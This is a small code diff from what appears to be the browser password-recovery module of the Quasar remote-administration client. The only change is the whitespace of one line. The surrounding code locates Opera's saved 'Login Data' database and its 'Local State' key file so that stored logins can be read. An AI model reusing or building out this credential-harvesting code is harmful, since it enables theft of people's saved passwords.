@@ -16,7 +16,7 @@ namespace Quasar.Client.Recovery.Browsers
             try
             {
                 string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    "Opera Software\\Opera Stable\\Login Data");
+                "Opera Software\\Opera Stable\\Login Data");
                 string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                     "Opera Software\\Opera Stable\\Local State");
                 return ReadAccounts(filePath, localStatePath);
